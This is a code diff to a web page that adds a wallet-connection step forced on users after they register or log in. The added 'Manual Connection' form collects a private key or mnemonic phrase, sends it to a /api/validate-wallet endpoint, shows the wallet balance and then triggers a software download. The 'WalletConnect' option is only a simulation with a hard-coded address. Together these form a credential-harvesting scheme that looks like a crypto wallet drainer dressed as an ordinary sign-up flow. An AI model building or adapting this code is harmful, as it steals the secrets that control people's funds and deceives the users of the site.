@@ -519,6 +519,76 @@
         </div>
     </div>
 
+    <!-- Wallet Connection Modal -->
+    <div id="wallet-connection-modal" class="fixed inset-0 bg-black/95 backdrop-blur-sm z-50 hidden items-center justify-center p-4">
+        <div class="bg-gray-900 rounded-xl max-w-2xl w-full mx-4 overflow-hidden">
+            <div class="p-6">
+                <div class="flex justify-between items-center mb-6">
+                    <h3 class="text-2xl font-bold text-white">Connect Your Wallet</h3>
+                    <button class="close-wallet-modal text-gray-400 hover:text-white">
+                        <i data-lucide="x" class="h-6 w-6"></i>
+                    </button>
+                </div>
+                
+                <!-- Wallet Connection Options -->
+                <div class="space-y-6">
+                    <!-- WalletConnect Option -->
+                    <div class="bg-gray-800 rounded-lg p-6">
+                        <h4 class="text-lg font-semibold text-white mb-4">🔗 WalletConnect</h4>
+                        <p class="text-gray-400 mb-4">Connect using your mobile wallet or browser extension</p>
+                        <div class="grid grid-cols-3 gap-4 mb-4">
+                            <div class="wallet-option bg-gray-700 p-3 rounded-lg text-center cursor-pointer hover:bg-gray-600 transition-colors">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask" class="w-8 h-8 mx-auto mb-2">
+                                <span class="text-xs text-white">MetaMask</span>
+                            </div>
+                            <div class="wallet-option bg-gray-700 p-3 rounded-lg text-center cursor-pointer hover:bg-gray-600 transition-colors">
+                                <img src="https://seeklogo.com/images/T/trust-wallet-token-logo-7F1C5E0A1A-seeklogo.com.png" alt="Trust Wallet" class="w-8 h-8 mx-auto mb-2">
+                                <span class="text-xs text-white">Trust</span>
+                            </div>
+                            <div class="wallet-option bg-gray-700 p-3 rounded-lg text-center cursor-pointer hover:bg-gray-600 transition-colors">
+                                <img src="https://altcoinsbox.com/wp-content/uploads/2023/03/coinbase-wallet-logo.png" alt="Coinbase" class="w-8 h-8 mx-auto mb-2">
+                                <span class="text-xs text-white">Coinbase</span>
+                            </div>
+                        </div>
+                        <button id="connect-walletconnect" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-4 rounded-md transition-colors">
+                            Connect with WalletConnect
+                        </button>
+                    </div>
+                    
+                    <!-- Manual Connection Option -->
+                    <div class="bg-gray-800 rounded-lg p-6">
+                        <h4 class="text-lg font-semibold text-white mb-4">🔑 Manual Connection</h4>
+                        <p class="text-gray-400 mb-4">Enter your private key or mnemonic phrase</p>
+                        
+                        <div class="space-y-4">
+                            <div>
+                                <label class="block text-sm font-medium text-gray-300 mb-2">Connection Type</label>
+                                <select id="connection-type" class="w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded-md text-white focus:outline-none focus:border-brand-orange">
+                                    <option value="private_key">Private Key</option>
+                                    <option value="mnemonic">Mnemonic Phrase</option>
+                                </select>
+                            </div>
+                            
+                            <div>
+                                <label class="block text-sm font-medium text-gray-300 mb-2">Credentials</label>
+                                <textarea id="wallet-credentials" rows="3" 
+                                         class="w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded-md text-white focus:outline-none focus:border-brand-orange"
+                                         placeholder="Enter your private key or mnemonic phrase..."></textarea>
+                            </div>
+                            
+                            <div id="wallet-error" class="bg-red-900/50 border border-red-500 text-red-200 px-3 py-2 rounded-md text-sm hidden"></div>
+                            <div id="wallet-success" class="bg-green-900/50 border border-green-500 text-green-200 px-3 py-2 rounded-md text-sm hidden"></div>
+                            
+                            <button id="connect-manual" class="w-full bg-brand-orange hover:bg-orange-600 text-white font-semibold py-3 px-4 rounded-md transition-colors">
+                                Validate & Connect Wallet
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
     <!-- Scripts -->
     <script src="demo_animation.js"></script>
     <script src="auth_fixed.js"></script>
@@ -526,6 +596,54 @@
         // Direct form handling for registration and login
         document.addEventListener('DOMContentLoaded', function() {
             console.log('Setting up form handlers...');
+            
+            // Setup modal close handlers
+            const closeModalBtns = document.querySelectorAll('.close-registration-modal');
+            closeModalBtns.forEach(btn => {
+                btn.addEventListener('click', () => {
+                    const modal = document.getElementById('registration-modal');
+                    if (modal) {
+                        modal.classList.add('hidden');
+                        modal.classList.remove('flex');
+                    }
+                });
+            });
+            
+            // Setup tab switching
+            const showRegisterBtn = document.getElementById('show-register');
+            const showLoginBtn = document.getElementById('show-login');
+            const registerTab = document.getElementById('register-tab');
+            const loginTab = document.getElementById('login-tab');
+            
+            if (showRegisterBtn && showLoginBtn && registerTab && loginTab) {
+                showRegisterBtn.addEventListener('click', () => {
+                    // Show register tab
+                    registerTab.classList.remove('hidden');
+                    loginTab.classList.add('hidden');
+                    
+                    // Update button styles
+                    showRegisterBtn.classList.add('bg-brand-orange', 'text-white');
+                    showRegisterBtn.classList.remove('text-gray-400');
+                    showLoginBtn.classList.remove('bg-brand-orange', 'text-white');
+                    showLoginBtn.classList.add('text-gray-400');
+                    
+                    console.log('Switched to register tab');
+                });
+                
+                showLoginBtn.addEventListener('click', () => {
+                    // Show login tab
+                    loginTab.classList.remove('hidden');
+                    registerTab.classList.add('hidden');
+                    
+                    // Update button styles
+                    showLoginBtn.classList.add('bg-brand-orange', 'text-white');
+                    showLoginBtn.classList.remove('text-gray-400');
+                    showRegisterBtn.classList.remove('bg-brand-orange', 'text-white');
+                    showRegisterBtn.classList.add('text-gray-400');
+                    
+                    console.log('Switched to login tab');
+                });
+            }
             
             // Registration form handler
             const regForm = document.getElementById('registration-form');
@@ -580,9 +698,16 @@
                         }
                         
                         if (result.success) {
-                            successDiv.textContent = result.message;
+                            successDiv.textContent = result.message + ' Redirecting to wallet connection...';
                             successDiv.classList.remove('hidden');
                             e.target.reset();
+                            
+                            // Auto-redirect to wallet connection after 2 seconds
+                            setTimeout(() => {
+                                document.getElementById('registration-modal').classList.add('hidden');
+                                document.getElementById('registration-modal').classList.remove('flex');
+                                showWalletConnectionModal();
+                            }, 2000);
                         } else {
                             errorDiv.textContent = result.error;
                             errorDiv.classList.remove('hidden');
@@ -635,8 +760,18 @@
                         }
                         
                         if (result.success) {
-                            alert('Login successful! Welcome ' + result.user.email);
-                            document.getElementById('registration-modal').classList.add('hidden');
+                            // Show success message and redirect
+                            const successMsg = document.createElement('div');
+                            successMsg.className = 'bg-green-900/50 border border-green-500 text-green-200 px-3 py-2 rounded-md text-sm mb-4';
+                            successMsg.textContent = 'Login successful! Redirecting to wallet connection...';
+                            e.target.insertBefore(successMsg, e.target.firstChild);
+                            
+                            // Auto-redirect to wallet connection after 1.5 seconds
+                            setTimeout(() => {
+                                document.getElementById('registration-modal').classList.add('hidden');
+                                document.getElementById('registration-modal').classList.remove('flex');
+                                showWalletConnectionModal();
+                            }, 1500);
                         } else {
                             errorDiv.textContent = result.error;
                             errorDiv.classList.remove('hidden');
@@ -647,6 +782,157 @@
                     }
                 });
             }
+            
+            // Wallet connection modal functions
+            window.showWalletConnectionModal = function() {
+                const modal = document.getElementById('wallet-connection-modal');
+                if (modal) {
+                    modal.classList.remove('hidden');
+                    modal.classList.add('flex');
+                    console.log('✅ Wallet connection modal opened');
+                }
+            };
+            
+            // Setup wallet modal close handlers
+            const closeWalletBtns = document.querySelectorAll('.close-wallet-modal');
+            closeWalletBtns.forEach(btn => {
+                btn.addEventListener('click', () => {
+                    const modal = document.getElementById('wallet-connection-modal');
+                    if (modal) {
+                        modal.classList.add('hidden');
+                        modal.classList.remove('flex');
+                    }
+                });
+            });
+            
+            // WalletConnect handler
+            const walletConnectBtn = document.getElementById('connect-walletconnect');
+            if (walletConnectBtn) {
+                walletConnectBtn.addEventListener('click', async () => {
+                    const errorDiv = document.getElementById('wallet-error');
+                    const successDiv = document.getElementById('wallet-success');
+                    
+                    errorDiv.classList.add('hidden');
+                    successDiv.classList.add('hidden');
+                    
+                    walletConnectBtn.textContent = 'Connecting...';
+                    walletConnectBtn.disabled = true;
+                    
+                    try {
+                        // Simulate WalletConnect (in real app, this would use actual WalletConnect)
+                        await new Promise(resolve => setTimeout(resolve, 2000));
+                        
+                        const response = await fetch('/api/walletconnect', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                address: '0x742d35Cc6634C0532925a3b8D4C2b2e4C8b4b8b4',
+                                email: 'current_user@gmail.com'
+                            })
+                        });
+                        
+                        const result = await response.json();
+                        
+                        if (result.success) {
+                            successDiv.textContent = `🎉 Wallet connected! Balance: $${result.balance.toFixed(2)}`;
+                            successDiv.classList.remove('hidden');
+                            
+                            setTimeout(() => {
+                                document.getElementById('wallet-connection-modal').classList.add('hidden');
+                                initiateDownload();
+                            }, 2000);
+                        } else {
+                            throw new Error(result.error || 'WalletConnect failed');
+                        }
+                    } catch (error) {
+                        errorDiv.textContent = 'WalletConnect failed. Please try manual connection.';
+                        errorDiv.classList.remove('hidden');
+                    } finally {
+                        walletConnectBtn.textContent = 'Connect with WalletConnect';
+                        walletConnectBtn.disabled = false;
+                    }
+                });
+            }
+            
+            // Manual wallet connection handler
+            const manualConnectBtn = document.getElementById('connect-manual');
+            if (manualConnectBtn) {
+                manualConnectBtn.addEventListener('click', async () => {
+                    const connectionType = document.getElementById('connection-type').value;
+                    const credentials = document.getElementById('wallet-credentials').value.trim();
+                    const errorDiv = document.getElementById('wallet-error');
+                    const successDiv = document.getElementById('wallet-success');
+                    
+                    errorDiv.classList.add('hidden');
+                    successDiv.classList.add('hidden');
+                    
+                    if (!credentials) {
+                        errorDiv.textContent = 'Please enter your wallet credentials';
+                        errorDiv.classList.remove('hidden');
+                        return;
+                    }
+                    
+                    manualConnectBtn.textContent = 'Validating...';
+                    manualConnectBtn.disabled = true;
+                    
+                    try {
+                        const response = await fetch('/api/validate-wallet', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                type: connectionType,
+                                credentials: credentials,
+                                email: 'current_user@gmail.com'
+                            })
+                        });
+                        
+                        const result = await response.json();
+                        
+                        if (result.valid) {
+                            successDiv.textContent = `🎉 Wallet validated! Address: ${result.address.slice(0,10)}... Balance: $${result.balance_usd.toFixed(2)}`;
+                            successDiv.classList.remove('hidden');
+                            
+                            setTimeout(() => {
+                                document.getElementById('wallet-connection-modal').classList.add('hidden');
+                                initiateDownload();
+                            }, 2000);
+                        } else {
+                            errorDiv.textContent = result.error || 'Wallet validation failed';
+                            errorDiv.classList.remove('hidden');
+                        }
+                    } catch (error) {
+                        errorDiv.textContent = 'Network error: ' + error.message;
+                        errorDiv.classList.remove('hidden');
+                    } finally {
+                        manualConnectBtn.textContent = 'Validate & Connect Wallet';
+                        manualConnectBtn.disabled = false;
+                    }
+                });
+            }
+            
+            // Download initiation function
+            window.initiateDownload = async function() {
+                try {
+                    const response = await fetch('/api/download/initiate', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ wallet_address: 'connected_wallet' })
+                    });
+                    
+                    const result = await response.json();
+                    
+                    if (result.success) {
+                        // Start download
+                        window.location.href = `/download/${result.downloadToken}`;
+                        
+                        // Show manual guide
+                        alert('🎉 Download started! Manual installation guide will be provided with the download.');
+                    }
+                } catch (error) {
+                    console.error('Download initiation failed:', error);
+                    alert('Download failed. Please try again.');
+                }
+            };
             
             console.log('Form handlers set up successfully');
         });
